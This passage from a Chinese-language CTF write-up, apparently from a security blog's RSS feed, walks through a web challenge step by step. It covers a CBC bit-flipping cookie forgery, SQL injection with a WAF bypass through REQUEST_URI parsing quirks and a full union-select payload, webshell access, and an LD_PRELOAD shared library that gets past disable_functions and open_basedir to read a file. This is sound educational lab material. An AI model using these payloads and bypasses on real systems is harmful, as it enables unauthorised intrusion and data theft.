^ ord(<span class="string">'d'</span>) ^ ord(<span class="string">'a'</span>)) + de[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">en = base64.b64encode(de2).replace(<span class="string">"+"</span>, <span class="string">"-"</span>).replace(<span class="string">"/"</span>, <span class="string">"_"</span>).replace(<span class="string">"="</span>, <span class="string">""</span>)</span><br><span class="line"><span class="comment"># cookie = &#123;"username": en&#125;</span></span><br><span class="line"><span class="comment"># req = requests.get(url, cookies=cookie)</span></span><br><span class="line"><span class="keyword">print</span> en</span><br><span class="line"><span class="comment"># 输出的en为admin的cookie</span></span><br></pre></td></tr></table></figure></p>
<p>第一个坑的CBC攻击好几种方法，还可以构造任意字符，所以在这存在注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span><br><span class="line">* <span class="doctag">@author</span> firesun </span><br><span class="line">* <span class="doctag">@website</span> https://github.com/firesunCN</span><br><span class="line">*/</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"header.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">'username'</span>]) || decrypt(<span class="variable">$_COOKIE</span>[<span class="string">'username'</span>]) === <span class="string">""</span>) &#123;</span><br><span class="line">    setcookie(<span class="string">"username"</span>);</span><br><span class="line">	header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"select * from user where username='"</span>.decrypt(<span class="variable">$_COOKIE</span>[<span class="string">'username'</span>]).<span class="string">"';"</span>;</span><br></pre></td></tr></table></figure></p>
<p>因为cookie的值是base编码过的，所以waf并没有用，不过这注入太麻烦了，建议还是踩第二个坑.</p>
<h1 id="坑2:_绕waf">坑2: 绕waf</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// admin/user.php</span></span><br><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span><br><span class="line">* <span class="doctag">@author</span> firesun </span><br><span class="line">* <span class="doctag">@website</span> https://github.com/firesunCN</span><br><span class="line">*/</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'header.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">"id"</span>])) &#123;</span><br><span class="line">	header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"select * from user where id="</span>.<span class="variable">$_REQUEST</span>[<span class="string">"id"</span>].<span class="string">";"</span>;</span><br></pre></td></tr></table></figure>
<p>这很明显是注入，不过却上了waf，表示这waf怼不动，哪位师傅怼得动？求教！</p>
<p>waf虽然怼不动，不过却有其他问题，在waf.php的76-85行对uri的处理有问题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uri</span> = explode(<span class="string">"?"</span>,<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$uri</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">	<span class="variable">$parameter</span> = explode(<span class="string">"&amp;"</span>,<span class="variable">$uri</span>[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$parameter</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">		<span class="variable">$v1</span> = explode(<span class="string">"="</span>,<span class="variable">$v</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$v1</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">			<span class="variable">$_REQUEST</span>[<span class="variable">$v1</span>[<span class="number">0</span>]] = stripStr(<span class="variable">$v1</span>[<span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>提出来本地测试一下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stripStr</span><span class="params">(<span class="variable">$str</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">        <span class="variable">$str</span> = stripslashes(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> addslashes(htmlspecialchars(<span class="variable">$str</span>, ENT_QUOTES, <span class="string">'UTF-8'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$_REQUEST value is: '</span>;</span><br><span class="line">var_dump(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;$_GET value is: '</span>;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;$uri value is: '</span>;</span><br><span class="line"><span class="variable">$uri</span> = explode(<span class="string">"?"</span>,<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">var_dump(<span class="variable">$uri</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>.<span class="string">'now the $_REQUEST value is: '</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$uri</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">	<span class="variable">$parameter</span> = explode(<span class="string">"&amp;"</span>,<span class="variable">$uri</span>[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$parameter</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">		<span class="variable">$v1</span> = explode(<span class="string">"="</span>,<span class="variable">$v</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$v1</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">			<span class="variable">$_REQUEST</span>[<span class="variable">$v1</span>[<span class="number">0</span>]] = stripStr(<span class="variable">$v1</span>[<span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>访问：<code>http://127.0.0.1/test/test.php?id=2?&amp;id=3</code><br>输出：<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_REQUEST <span class="keyword">value</span> is: <span class="built_in">array</span>(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; <span class="built_in">string</span>(<span class="number">1</span>) <span class="string">"3"</span> &#125;</span><br><span class="line">$_GET <span class="keyword">value</span> is: <span class="built_in">array</span>(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; <span class="built_in">string</span>(<span class="number">1</span>) <span class="string">"3"</span> &#125;</span><br><span class="line">$uri <span class="keyword">value</span> is: <span class="built_in">array</span>(<span class="number">3</span>) &#123; [<span class="number">0</span>]=&gt; <span class="built_in">string</span>(<span class="number">14</span>) <span class="string">"/test/test.php"</span> [<span class="number">1</span>]=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">"id=2"</span> [<span class="number">2</span>]=&gt; <span class="built_in">string</span>(<span class="number">5</span>) <span class="string">"&amp;id=3"</span> &#125;</span><br><span class="line">now the $_REQUEST <span class="keyword">value</span> is: <span class="built_in">array</span>(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; <span class="built_in">string</span>(<span class="number">1</span>) <span class="string">"2"</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>所以根本不需要怼waf，uri被处理后，$_GET和$_REQUEST的值可以不一样，然后直接注入就好了</p>
<p>payload: <code>http://451bf8ea3268360ee.jie.sangebaimao.com/admin/user.php?id=-1/**/union/**/select/**/1,2,3,(select/**/content/**/from/**/memo),5?&amp;id=3</code></p>
<p>得到信息:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/NQTGmhlG3im8PUcsO2GgMCieThLtbqi4.php</span><br><span class="line">password:firesun</span><br><span class="line">flag <span class="keyword">is</span> <span class="keyword">at</span> /.</span><br></pre></td></tr></table></figure></p>
<p>然后就是最后一步了</p>
<h1 id="坑3:_bypass_open_basedir">坑3: bypass open_basedir</h1><p>给的信息一看就知道是webshell, 先开AntSword连马，发现啥也干不了，看了看phpinfo()，发现ban了一堆函数，看着咋这么熟悉……这不是ALICTF的homework么，出题人也都是firesun师傅. </p>
<p>首先看看能不能写文件，写文件的方法是从homework想出来的，使用<code>move_uploaded_file</code>，文件上传的函数写到<code>/tmp</code>目录下，读文件通过<code>highlight_file</code>或者<code>show_source</code>这类函数, 这里还有一个小坑，上传到<code>/tmp</code>目录的文件会被秒删，我们秒读就好了.</p>
<p>bypass open_basedir方法链接: <a href="http://drops.wooyun.org/tips/16054" target="_blank" rel="external">http://drops.wooyun.org/tips/16054</a></p>
<p>不过和homework一样，服务器的命令基本都被ban了(像啥nc, cat, python，ls)全被ban了，所以按照homework的套路，用C来读目录和文件</p>
<figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ddog.c</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span>&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span>&lt;stdio.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span>&lt;string.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span>&lt;dirent.h&gt;</span></span><br><span class="line"></span><br><span class="line">void payload<span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//DIR *dirp;</span></span><br><span class="line">	<span class="comment">//struct dirent *dp;</span></span><br><span class="line">	FILE <span class="built_in">*</span>fp, <span class="built_in">*</span>fp2;</span><br><span class="line">	char buf[<span class="number">100</span>];</span><br><span class="line">	<span class="comment">//dirp = opendir("/");  //flag在/目录下</span></span><br><span class="line">	fp = fopen<span class="params">(<span class="string">"/tmp/tteesstt"</span>, <span class="string">"w"</span>)</span>;</span><br><span class="line">	fp2 = fopen<span class="params">(<span class="string">"/flag_gei_ni_ni_Ye_du_bu_LIAO"</span>, <span class="string">"r"</span>)</span>;</span><br><span class="line">	fgets<span class="params">(buf, <span class="number">100</span>, fp2)</span>;</span><br><span class="line">	fputs<span class="params">(buf, fp)</span>;</span><br><span class="line">	<span class="comment">//while ((dp = readdir(dirp)) != NULL) &#123;</span></span><br><span class="line">	<span class="comment">//	fputs(dp-&gt;d_name, fp);    //得到/flag_gei_ni_ni_Ye_du_bu_LIAO文件路径</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">	fclose<span class="params">(fp)</span>;</span><br><span class="line">	fclose<span class="params">(fp2)</span>;</span><br><span class="line">	<span class="comment">//closedir(dirp);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int geteuid<span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="params">(getenv<span class="params">(<span class="string">"LD_PRELOAD"</span>)</span> == NULL)</span> &#123;</span><br><span class="line">		return <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	unsetenv<span class="params">(<span class="string">"LD_PRELOAD"</span>)</span>;</span><br><span class="line">	payload<span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译成so库<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>gcc -c -fPIC ddog.c -o ddog</span><br><span class="line"><span class="variable">$ </span>gcc -shared ddog -o ddog.so</span><br></pre></td></tr></table></figure></p>
<p>得到<code>ddog.so</code>，上传到<code>/tmp</code>，读文件信息一条龙:<br><img src="/img/sanmao.png" alt="sanmao"></p>
]]></content:encoded>
      <comments>http://0x48.pw/2016/06/17/0x1C/#disqus_comments</comments>
    </item>
    
  </channel>
</rss>